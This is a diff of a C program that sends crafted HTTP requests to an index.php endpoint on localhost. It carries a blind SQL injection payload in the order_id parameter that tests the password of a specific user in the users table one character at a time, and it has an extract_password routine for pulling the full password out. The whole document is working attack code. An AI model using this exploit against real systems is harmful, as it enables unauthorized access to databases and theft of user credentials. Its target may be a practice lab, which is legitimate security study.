@@ -19,17 +19,11 @@ int send_request_and_check(char *payload) {
     char request[512], response[1024];
 
     // Construct the full HTTP request
-    // snprintf(request, sizeof(request),
-    //          "GET /index.php?order_id=%s HTTP/1.1\r\n"
-    //          "Host: localhost\r\n"
-    //          "Connection: close\r\n\r\n",
-    //          payload);
-
     snprintf(request, sizeof(request),
-             "GET /index.php?order_id=1%27%20AND%20(SELECT%20ASCII(SUBSTRING(password,1,1))%3D32%20FROM%20users%20WHERE%20id%3D315177444)%20--%20 HTTP/1.1
-              Host: localhost
-              Connection: close
-             ");
+             "GET /index.php?order_id=%s HTTP/1.1\r\n"
+             "Host: localhost\r\n"
+             "Connection: close\r\n\r\n",
+             payload);
 
     // Create socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -109,9 +103,8 @@ void extract_password() {
 }
 
 int main() {
-    
+    int x = send_request_and_check("1%27%20AND%20(SELECT%20ASCII(SUBSTRING(password,1,1))%3D32%20FROM%20users%20WHERE%20id%3D315177444)%20--%20");
+    printf("%d\n", x);
     //extract_password();
-    // try one request 
-    send_request_and_check("1' AND (SELECT ASCII(SUBSTRING(password,1,1))=32 FROM users WHERE id=315177444) -- ");
     return 0;
 }
